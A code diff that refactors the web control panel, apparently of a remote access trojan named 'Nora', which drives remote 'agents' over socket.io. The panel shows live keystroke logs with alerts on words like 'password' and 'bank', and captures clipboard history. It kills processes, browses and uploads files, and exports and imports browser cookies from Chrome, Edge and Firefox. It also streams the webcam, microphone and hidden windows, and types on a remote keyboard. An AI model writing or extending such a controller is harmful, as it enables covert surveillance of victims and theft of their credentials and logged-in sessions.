-    width:100%; box-sizing:border-box; padding:10px 12px;
-    background:#0d0d0d; border:none; border-radius:0 0 10px 10px;
-    color:#e0e0e0; font-family:Consolas,monospace; font-size:13px;
-    resize:none; outline:none; height:90px;
-    caret-color:#7c6aff;
-  }
-  #kbd-box::placeholder { color:#333; }
-  #kbd-hint { padding:6px 12px 10px; font-size:10px; color:#333; text-align:center; }
-  #kbd-toggle-btn {
-    background:#1e1a2e; border:1px solid #3a3060; color:#a78bfa;
-    padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px;
-    font-family:Consolas,monospace; margin-top:5px;
-  }
-  #kbd-toggle-btn:hover { background:#2d2650; }
-
-  /* ── Mobile ──────────────────────────────────────────────────────────────── */
-  #sidebar-handle { display:none; }
-
-  @media (max-width: 768px) {
-    body { touch-action: manipulation; }
-
-    #topbar { padding:6px 10px; gap:6px; }
-    #topbar h1 { font-size:12px; letter-spacing:1px; }
-    #fps-info, #no-agents { display:none; }
-    #status { font-size:11px; padding:3px 8px; }
-    #agent-select { flex:1; min-width:0; font-size:12px; }
-    .topbar-btn { padding:6px 9px; font-size:11px; letter-spacing:0; min-height:34px; touch-action:manipulation; }
-    #rec-btn { margin-left:0; }
-    #rec-timer { display:none !important; }
-
-    #main { flex-direction:column; }
-
-    #view-area { height:52vh; flex:none; overflow:hidden; }
-    #screen-panel { flex:1; }
-    #camera-panel { height:110px; }
-
-    #sidebar {
-      width:100%;
-      flex:none;
-      height:48vh;
-      border-left:none;
-      border-top:2px solid #2a2a2a;
-      transition:height .25s ease;
-      overflow:hidden;
-    }
-    #sidebar.collapsed { height:38px; }
-
-    #sidebar-handle {
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      padding:0 12px;
-      height:38px;
-      background:#1a1a1a;
-      border-bottom:1px solid #2a2a2a;
-      cursor:pointer;
-      flex-shrink:0;
-      user-select:none;
-      -webkit-user-select:none;
-    }
-    #sidebar-handle span { font-size:10px; color:#7c6aff; text-transform:uppercase; letter-spacing:1px; }
-    #sidebar-handle svg { width:14px; height:14px; fill:#555; transition:transform .25s; }
-    #sidebar.collapsed #sidebar-handle svg { transform:rotate(180deg); }
-
-    .tab-bar { display:none; }
-    #sidebar:not(.collapsed) .tab-bar { display:flex; }
-
-    .tab { padding:9px 4px; min-height:36px; font-size:10px; }
-
-    #control-panel { padding:6px 10px; }
-    .hotkey-hint { display:none; }
-
-    .proc-row { grid-template-columns:1fr 40px 46px 34px; }
-    .proc-kill { padding:3px 5px; min-height:28px; touch-action:manipulation; }
-
-    .clip-item { padding:8px 10px; }
-    .hdr-btn { padding:4px 9px; min-height:28px; touch-action:manipulation; }
-
-    #alert-input { font-size:13px; padding:5px 8px; }
-    #alert-add-btn { padding:5px 10px; font-size:12px; touch-action:manipulation; }
-  }
-
-  @media (max-width: 480px) {
-    .topbar-btn .btn-label { display:none; }
-  }
+@media (max-width: 768px) {
+  body { touch-action:manipulation; }
+  #topbar { padding:6px 10px; gap:6px; height:auto; flex-wrap:wrap; }
+  #topbar h1 { font-size:13px; }
+  #fps-info { display:none; }
+  #main { flex-direction:column; }
+  #view-area { height:52vh; flex:none; overflow:hidden; }
+  #screen-panel { flex:1; }
+  #camera-panel { height:100px; }
+  #sidebar { width:100%; flex:none; height:48vh; border-left:none; border-top:2px solid var(--border); transition:height .25s; overflow:hidden; }
+  #sidebar.collapsed { height:38px; }
+  #sidebar-handle { display:flex; align-items:center; justify-content:space-between; padding:0 12px; height:38px; background:var(--bg); border-bottom:1px solid var(--border); cursor:pointer; flex-shrink:0; user-select:none; }
+  #sidebar-handle span { font-size:10px; color:var(--accent); text-transform:uppercase; letter-spacing:.8px; font-weight:600; }
+  #sidebar-handle svg { width:14px; height:14px; fill:var(--dim); transition:transform .25s; }
+  #sidebar.collapsed #sidebar-handle svg { transform:rotate(180deg); }
+  .tab-bar { display:none; }
+  #sidebar:not(.collapsed) .tab-bar { display:flex; }
+  .tab { padding:9px 4px; min-height:36px; }
+  .topbar-btn { padding:5px 10px; font-size:11px; }
+  #rec-btn { margin-left:0; }
+  .hotkey-hint { display:none; }
+  .proc-row { grid-template-columns:1fr 38px 46px 32px; }
+  .proc-kill { min-height:28px; }
+  .hdr-btn { min-height:28px; }
+  #alert-input { font-size:13px; }
+}
+@media (max-width: 480px) {
+  .topbar-btn .btn-label { display:none; }
+}
 </style>
 </head>
 <body>
 
 <div id="topbar">
-  <h1>Nora Hub</h1>
+  <h1>NORA</h1>
   <span id="status" class="disconnected">Disconnected</span>
   <select id="agent-select" onchange="selectAgent(this.value)">
     <option value="">— no agents —</option>
   </select>
-  <span id="no-agents" style="font-size:11px;color:#555;display:none;">Waiting for agents…</span>
   <span id="fps-info">-- fps</span>
   <span id="rec-timer"></span>
   <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 <span class="btn-label">Camera</span></button>
@@ -314,90 +310,87 @@
     <div class="tab-bar">
       <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
       <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
-      <div class="tab" onclick="switchTab('processes')">Processes</div>
+      <div class="tab" onclick="switchTab('processes')">Procs</div>
       <div class="tab" onclick="switchTab('files')">Files</div>
       <div class="tab" onclick="switchTab('cookies')">🍪</div>
     </div>
 
+    <!-- Keylog -->
     <div id="tab-keylog" class="tab-panel active">
       <div class="panel-header">
-        Keylog
+        Keystroke Log
         <div style="display:flex;gap:5px;">
-          <button class="hdr-btn" onclick="saveLog()">Save .txt</button>
+          <button class="hdr-btn" onclick="saveLog()">Save</button>
           <button class="hdr-btn" onclick="clearLog()">Clear</button>
         </div>
       </div>
       <div id="keylog"></div>
       <div id="alert-section">
-        <label>Keyword Alerts (browser notification)</label>
+        <label>Keyword Alerts</label>
         <div id="alert-input-row">
-          <input id="alert-input" placeholder="e.g. password, bank..." onkeydown="if(event.key==='Enter')addAlert()">
+          <input id="alert-input" placeholder="e.g. password, bank…" onkeydown="if(event.key==='Enter')addAlert()">
           <button id="alert-add-btn" onclick="addAlert()">Add</button>
         </div>
         <div id="alert-tags"></div>
       </div>
     </div>
 
+    <!-- Clipboard -->
     <div id="tab-clipboard" class="tab-panel">
-      <div class="panel-header">
-        Clipboard History
-        <button class="hdr-btn" onclick="clearClipboard()">Clear</button>
-      </div>
-      <div id="clipboard-list"><span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span></div>
+      <div class="panel-header">Clipboard History <button class="hdr-btn" onclick="clearClipboard()">Clear</button></div>
+      <div id="clipboard-list"><span style="color:var(--dim);padding:10px;font-size:11px;">Nothing copied yet…</span></div>
     </div>
 
+    <!-- Processes -->
     <div id="tab-processes" class="tab-panel">
       <div id="proc-controls">
-        <input id="proc-search" placeholder="Search process..." oninput="filterProcs()">
-        <button id="proc-refresh" onclick="loadProcs()">Refresh</button>
+        <input id="proc-search" placeholder="Search…" oninput="filterProcs()">
+        <button id="proc-refresh" onclick="loadProcs()">↻ Refresh</button>
       </div>
       <div class="proc-header"><span>Name</span><span style="text-align:right">CPU%</span><span style="text-align:right">MB</span><span></span></div>
       <div id="proc-list"></div>
     </div>
 
+    <!-- Files -->
     <div id="tab-files" class="tab-panel">
       <div id="fm-path-bar">
-        <span>📂</span>
         <div id="fm-breadcrumb">/</div>
-        <button id="fm-up-btn" onclick="fmUp()" title="Up">↑ Up</button>
-        <label id="fm-upload-btn" title="Upload file">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
+        <button id="fm-up-btn" onclick="fmUp()">↑ Up</button>
+        <label id="fm-upload-btn">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
       </div>
-      <div id="fm-list"><div id="fm-status">Select an agent and open Files tab</div></div>
+      <div id="fm-list"><div id="fm-status">Select an agent and open Files</div></div>
     </div>
 
-    <div id="tab-cookies" class="tab-panel">
-      <div class="panel-header">Browser Cookies</div>
-      <div style="padding:12px;display:flex;flex-direction:column;gap:10px;">
-        <div style="font-size:10px;color:#555;line-height:1.6;">Export cookies from the agent PC (Chrome, Edge, Firefox) or push cookies to it. Close browsers on the agent PC first.</div>
-        <button class="hdr-btn" id="ck-export-btn" onclick="cookieExport()" style="padding:7px 0;font-size:11px;">⬇ Export Cookies from Agent</button>
-        <div id="ck-export-status" style="font-size:10px;color:#555;min-height:14px;"></div>
-        <hr style="border:none;border-top:1px solid #222;">
-        <div style="font-size:10px;color:#555;">Push cookies TO agent (import a cookies_export.json):</div>
-        <label style="padding:7px 0;font-size:11px;background:#2a2a2a;border:1px solid #333;color:#aaa;border-radius:4px;text-align:center;cursor:pointer;">
-          ⬆ Import Cookies to Agent
-          <input type="file" id="ck-import-file" accept=".json" style="display:none" onchange="cookieImport(this)">
-        </label>
-        <div id="ck-import-status" style="font-size:10px;color:#555;min-height:14px;"></div>
-      </div>
+    <!-- Cookies -->
+    <div id="tab-cookies" class="tab-panel" style="overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;">
+      <p class="ck-note">Export cookies from Chrome, Edge, Firefox on the agent PC. Close those browsers first.</p>
+      <button class="ck-btn" id="ck-export-btn" onclick="cookieExport()">⬇ Export Cookies from Agent</button>
+      <div id="ck-export-status" class="ck-status"></div>
+      <hr class="ck-divider">
+      <p class="ck-note">Import a cookies_export.json back to the agent.</p>
+      <label class="ck-btn" style="text-align:center;cursor:pointer;">
+        ⬆ Import Cookies to Agent
+        <input type="file" id="ck-import-file" accept=".json" style="display:none" onchange="cookieImport(this)">
+      </label>
+      <div id="ck-import-status" class="ck-status"></div>
     </div>
 
+    <!-- Control panel (always visible below tabs) -->
     <div id="control-panel">
       <label><input type="checkbox" id="ctrl-toggle" checked> Remote control active</label>
-      <div class="hotkey-hint">Ctrl+Shift+D — toggle control</div>
-      <button id="kbd-toggle-btn" onclick="toggleKbd()" title="Open remote keyboard window">⌨ Remote Keyboard</button>
-
+      <div class="hotkey-hint">Ctrl+Shift+D — toggle</div>
+      <button id="kbd-toggle-btn" onclick="toggleKbd()">⌨ Remote Keyboard</button>
       <div id="desktop-controls">
-        <span style="font-size:10px;color:#444;">Desktops:</span>
-        <button class="desk-btn" onclick="desktopCmd('new')" title="New desktop (Win+Ctrl+D)">⊞ New</button>
-        <button class="desk-btn" onclick="desktopCmd('left')" title="Switch left">◀</button>
-        <button class="desk-btn" onclick="desktopCmd('right')" title="Switch right">▶</button>
-        <button class="desk-btn" onclick="desktopCmd('close')" title="Close desktop" style="color:#f87171;border-color:#4a2a2a;">✕</button>
+        <span style="font-size:10px;color:var(--dim);">Desktop:</span>
+        <button class="desk-btn" onclick="desktopCmd('new')">⊞ New</button>
+        <button class="desk-btn" onclick="desktopCmd('left')">◀</button>
+        <button class="desk-btn" onclick="desktopCmd('right')">▶</button>
+        <button class="desk-btn" onclick="desktopCmd('close')" style="color:var(--red);border-color:#7f1d1d;">✕</button>
       </div>
-
       <div id="win-picker">
         <button id="win-picker-btn" onclick="openWinPicker()">🎯 Pick Target Window</button>
-        <div id="win-target-label"><span>Target: </span><span id="win-target-title">—</span></div>
-      <div id="win-stream-badge">👁 Streaming window · <button id="win-stream-stop" onclick="stopWinStream()">⏹ Stop</button></div>
+        <div id="win-target-label"><span style="color:var(--dim)">Target: </span><span id="win-target-title">—</span></div>
+        <div id="win-stream-badge">👁 Streaming · <button id="win-stream-stop" onclick="stopWinStream()">Stop</button></div>
       </div>
     </div>
   </div>
@@ -411,11 +404,11 @@
       <button id="win-modal-close" onclick="closeWinPicker()">✕</button>
     </div>
     <div id="win-list"></div>
-    <button id="win-clear-btn" onclick="clearWinTarget()">✕ Clear target (use normal control)</button>
+    <button id="win-clear-btn" onclick="clearWinTarget()">✕ Clear target</button>
   </div>
 </div>
 
-<!-- Remote Keyboard floating window -->
+<!-- Remote keyboard -->
 <div id="kbd-window">
   <div id="kbd-titlebar" onmousedown="kbdDragStart(event)">
     <span>⌨</span>
@@ -427,7 +420,7 @@
     <span id="kbd-last">Type below — keys go to remote PC</span>
   </div>
   <textarea id="kbd-box" placeholder="Click here and start typing…" spellcheck="false" autocorrect="off" autocomplete="off"></textarea>
-  <div id="kbd-hint">Keys are sent live · textarea clears automatically</div>
+  <div id="kbd-hint">Keys sent live · textarea clears automatically</div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
@@ -449,6 +442,7 @@ const camPanel    = document.getElementById("camera-panel");
 const camFeed     = document.getElementById("camera-feed");
 const camPlaceholder = document.getElementById("cam-placeholder");
 const agentSelect = document.getElementById("agent-select");
+const micBtn      = document.getElementById("mic-btn");
 
 let selectedAgent = "";
 let frameCount = 0, lastFpsTime = Date.now();
@@ -463,7 +457,6 @@ const socket = io(RELAY, { transports: ["polling", "websocket"] });
 // ── Audio ─────────────────────────────────────────────────────────────────────
 let audioCtx = null, audioNextTime = 0;
 const SAMPLE_RATE = 16000;
-const micBtn = document.getElementById("mic-btn");
 
 function getAudioCtx() {
   if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
@@ -544,8 +537,6 @@ function selectAgent(name) {
   clearClipboard();
 }
 
-function target() { return selectedAgent; }
-
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(name) {
   const names = ["keylog", "clipboard", "processes", "files", "cookies"];
@@ -584,17 +575,15 @@ socket.on("key", d => {
 
   keylogText += char === "↵" ? "\n" : char;
 
-  // New app header when app changes
   if (app !== _klLastApp) {
     _klLastApp = app;
     _klCurLine = null; _klCurChars = null;
     const hdr = document.createElement("div");
     hdr.className = "kl-app-header";
-    hdr.innerHTML = `<span class="kl-app-icon">🖥</span><span class="kl-app-name">${escHtml(app)}</span><span class="kl-app-time">${escHtml(time)}</span>`;
+    hdr.innerHTML = `<span style="font-size:11px">🖥</span><span class="kl-app-name">${escHtml(app)}</span><span class="kl-app-time">${escHtml(time)}</span>`;
     keylogEl.appendChild(hdr);
   }
 
-  // ENTER starts a new line
   if (char === "↵" || char === "[ENTER]") {
     _klCurLine = null; _klCurChars = null;
     const br = document.createElement("div");
@@ -606,7 +595,6 @@ socket.on("key", d => {
     return;
   }
 
-  // Reuse current line or create new one
   if (!_klCurLine) {
     _klCurLine = document.createElement("div");
     _klCurLine.className = "kl-line";
@@ -669,7 +657,7 @@ function checkAlerts(text) {
       if (!_lastAlertAt[kw] || now - _lastAlertAt[kw] > 10000) {
         _lastAlertAt[kw] = now;
         if (Notification.permission === "granted")
-          new Notification("Nora Hub — Keyword Detected", { body: `"${kw}" was typed` });
+          new Notification("Nora — Keyword Detected", { body: `"${kw}" was typed` });
       }
     }
   });
@@ -685,7 +673,7 @@ socket.on("clipboard", d => {
   renderClipboard();
 });
 function renderClipboard() {
-  if (!clipItems.length) { clipList.innerHTML = '<span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span>'; return; }
+  if (!clipItems.length) { clipList.innerHTML = '<span style="color:var(--dim);padding:10px;font-size:11px;">Nothing copied yet…</span>'; return; }
   clipList.innerHTML = clipItems.map((c, i) =>
     `<div class="clip-item" onclick="copyClipItem(${i})">
       <div class="clip-time">${c.time} — click to copy</div>
@@ -737,7 +725,7 @@ function toggleCamera() {
 }
 function updateCamUI(active) {
   cameraActive = active;
-  camBtn.textContent = active ? "📷 Camera ON" : "📷 Camera";
+  camBtn.innerHTML = active ? "📷 <span class='btn-label'>Camera ON</span>" : "📷 <span class='btn-label'>Camera</span>";
   camBtn.className = active ? "topbar-btn active" : "topbar-btn";
   camPanel.className = active ? "visible" : "";
   camFeed.style.display = active ? "block" : "none";
@@ -761,11 +749,11 @@ async function toggleRecord() {
     mediaRecorder.ondataavailable = async e => { if (e.data?.size > 0) await fileWriter.write(e.data); };
     mediaRecorder.onstop = async () => {
       await fileWriter.close(); fileWriter = null; mediaRecorder = null;
-      recBtn.textContent = "⏺ REC"; recBtn.className = "topbar-btn";
+      recBtn.innerHTML = "⏺ <span class='btn-label'>REC</span>"; recBtn.className = "topbar-btn";
       recTimer.className = ""; clearInterval(recInterval); recSeconds = 0;
     };
     mediaRecorder.start(1000);
-    recBtn.textContent = "⏹ STOP"; recBtn.className = "topbar-btn recording";
+    recBtn.innerHTML = "⏹ <span class='btn-label'>STOP</span>"; recBtn.className = "topbar-btn recording";
     recSeconds = 0; recTimer.className = "visible";
     recInterval = setInterval(() => {
       recSeconds++;
@@ -806,11 +794,11 @@ document.addEventListener("keyup", e => {
   e.preventDefault(); cmd({ action:"keyup", key:e.key });
 });
 
-// ── Remote Keyboard window ───────────────────────────────────────────────────
-const kbdWindow  = document.getElementById("kbd-window");
-const kbdBox     = document.getElementById("kbd-box");
-const kbdDot     = document.getElementById("kbd-dot");
-const kbdLast    = document.getElementById("kbd-last");
+// ── Remote Keyboard ───────────────────────────────────────────────────────────
+const kbdWindow = document.getElementById("kbd-window");
+const kbdBox    = document.getElementById("kbd-box");
+const kbdDot    = document.getElementById("kbd-dot");
+const kbdLast   = document.getElementById("kbd-last");
 let kbdOpen = false;
 
 function toggleKbd() {
@@ -845,7 +833,6 @@ kbdBox.addEventListener("keyup", e => {
   cmd({ action: "keyup", key: e.key });
 });
 
-// Drag to move the keyboard window
 let _kx=0,_ky=0,_kl=0,_kt=0;
 function kbdDragStart(e) {
   const r = kbdWindow.getBoundingClientRect();
@@ -861,26 +848,21 @@ function kbdDragMove(e) {
 }
 function kbdDragEnd() { document.removeEventListener("mousemove", kbdDragMove); }
 
-// ── Desktop & window control ─────────────────────────────────────────────────
-let targetHwnd = null;   // HWND of the PostMessage target window
-let targetTitle = "";
+// ── Desktop & window control ──────────────────────────────────────────────────
+let targetHwnd = null, targetTitle = "";
 
-function desktopCmd(cmd) {
+function desktopCmd(c) {
   if (!selectedAgent) return;
-  socket.emit("desktop_cmd", { cmd, _target: selectedAgent });
+  socket.emit("desktop_cmd", { cmd: c, _target: selectedAgent });
 }
 
 function openWinPicker() {
   if (!selectedAgent) return;
   document.getElementById("win-modal").style.display = "block";
-  document.getElementById("win-list").innerHTML = '<div style="padding:14px;color:#555;font-size:11px;">Loading…</div>';
+  document.getElementById("win-list").innerHTML = '<div style="padding:14px;color:var(--dim);font-size:11px;">Loading…</div>';
   socket.emit("list_windows", { _target: selectedAgent });
 }
-
-function closeWinPicker() {
-  document.getElementById("win-modal").style.display = "none";
-}
-
+function closeWinPicker() { document.getElementById("win-modal").style.display = "none"; }
 function clearWinTarget() {
   targetHwnd = null; targetTitle = "";
   document.getElementById("win-target-label").style.display = "none";
@@ -891,7 +873,7 @@ function clearWinTarget() {
 socket.on("windows_list", data => {
   const list = document.getElementById("win-list");
   const wins = (data.windows || []).filter(w => w.title.trim());
-  if (!wins.length) { list.innerHTML = '<div style="padding:14px;color:#555;font-size:11px;">No windows found</div>'; return; }
+  if (!wins.length) { list.innerHTML = '<div style="padding:14px;color:var(--dim);font-size:11px;">No windows found</div>'; return; }
   list.innerHTML = wins.map(w =>
     `<div class="win-row${targetHwnd===w.hwnd?' selected':''}" onclick="selectWin(${w.hwnd},${JSON.stringify(w.title)})">
       <span style="flex:1">${w.title.substring(0,40)}</span>
@@ -909,9 +891,7 @@ function selectWin(hwnd, title) {
   closeWinPicker();
 }
 
-// ── Window stream (PrintWindow — captures without switching desktops) ─────────
 let winStreaming = false;
-
 function startWinStream(hwnd) {
   if (!selectedAgent) return;
   winStreaming = true;
@@ -919,14 +899,12 @@ function startWinStream(hwnd) {
   socket.emit("win_capture_start", { hwnd, _target: selectedAgent });
   closeWinPicker();
 }
-
 function stopWinStream() {
   if (!selectedAgent) return;
   winStreaming = false;
   document.getElementById("win-stream-badge").style.display = "none";
   socket.emit("win_capture_stop", { _target: selectedAgent });
 }
-
 socket.on("win_frame", d => {
   if (!winStreaming) return;
   if (d._agent && d._agent !== selectedAgent) return;
@@ -936,18 +914,17 @@ socket.on("win_frame", d => {
 // ── Cookie manager ────────────────────────────────────────────────────────────
 function cookieExport() {
   if (!selectedAgent) { alert("Select an agent first."); return; }
-  document.getElementById("ck-export-status").textContent = "Exporting… (close browsers on agent PC first)";
+  document.getElementById("ck-export-status").textContent = "Exporting…";
   document.getElementById("ck-export-btn").disabled = true;
   socket.emit("export_cookies", { _target: selectedAgent });
 }
-
 socket.on("cookies_data", d => {
   const st = document.getElementById("ck-export-status");
   const btn = document.getElementById("ck-export-btn");
   btn.disabled = false;
-  if (d.error) { st.style.color = "#f87171"; st.textContent = "Error: " + d.error; return; }
-  st.style.color = "#4ade80";
-  st.textContent = `Got ${d.count} cookies — downloading JSON…`;
+  if (d.error) { st.style.color = "var(--red)"; st.textContent = "Error: " + d.error; return; }
+  st.style.color = "var(--green)";
+  st.textContent = `Got ${d.count} cookies — downloading…`;
   const blob = new Blob([JSON.stringify(d.cookies, null, 2)], { type: "application/json" });
   const url  = URL.createObjectURL(blob);
   const a    = document.createElement("a");
@@ -955,41 +932,36 @@ socket.on("cookies_data", d => {
   document.body.appendChild(a); a.click();
   document.body.removeChild(a); URL.revokeObjectURL(url);
 });
-
 function cookieImport(input) {
   const file = input.files[0];
   if (!file || !selectedAgent) { alert("Select an agent and a JSON file."); return; }
   const st = document.getElementById("ck-import-status");
-  st.style.color = "#aaa"; st.textContent = "Reading file…";
+  st.style.color = "var(--muted)"; st.textContent = "Reading file…";
   const reader = new FileReader();
   reader.onload = e => {
     try {
       const cookies = JSON.parse(e.target.result);
-      st.textContent = `Sending ${cookies.length} cookies to agent (close browsers first)…`;
+      st.textContent = `Sending ${cookies.length} cookies…`;
       socket.emit("import_cookies", { cookies, _target: selectedAgent });
-    } catch { st.style.color = "#f87171"; st.textContent = "Invalid JSON file."; }
+    } catch { st.style.color = "var(--red)"; st.textContent = "Invalid JSON file."; }
   };
   reader.readAsText(file);
   input.value = "";
 }
-
 socket.on("import_result", d => {
   const st = document.getElementById("ck-import-status");
-  st.style.color = d.ok ? "#4ade80" : "#f87171";
+  st.style.color = d.ok ? "var(--green)" : "var(--red)";
   st.textContent = d.ok ? "Import done! " + (d.message || "") : "Error: " + d.message;
 });
 
-// PostMessage mouse: when target window selected, clicks on canvas go to target
+// PostMessage mouse click routing
 screenPanel.addEventListener("click", e => {
   if (!targetHwnd || !selectedAgent) return;
   const r = canvas.getBoundingClientRect();
   if (e.clientX < r.left || e.clientX > r.right || e.clientY < r.top || e.clientY > r.bottom) return;
   e.stopImmediatePropagation();
   const x = e.clientX - r.left, y = e.clientY - r.top;
-  socket.emit("win_mouse", {
-    hwnd: targetHwnd, x, y, sw: r.width, sh: r.height,
-    action: "click", button: e.button, _target: selectedAgent
-  });
+  socket.emit("win_mouse", { hwnd: targetHwnd, x, y, sw: r.width, sh: r.height, action: "click", button: e.button, _target: selectedAgent });
 }, true);
 
 // ── Sidebar toggle (mobile) ───────────────────────────────────────────────────
@@ -1030,7 +1002,6 @@ socket.on("dir_result", d => {
       </div>
     </div>`;
   }).join("");
-  // Store file list on the element to avoid backslash issues in inline onclick
   fmList._files = files;
   fmList._dir   = d.path;
   fmList.querySelectorAll(".fm-row").forEach(row => {
@@ -1054,7 +1025,6 @@ function fmUp() {
   const parts = fmCurPath.replace(/[/\\]+$/,"").split(/[\\/]/).filter(Boolean);
   if (parts.length <= 1) { fmLoadDir(sep); return; }
   parts.pop();
-  // Preserve drive letter for Windows paths (e.g. C:\)
   const rejoined = fmCurPath.match(/^[A-Za-z]:/)
     ? parts[0] + ":\\" + parts.slice(1).join(sep)
     : sep + parts.join(sep);
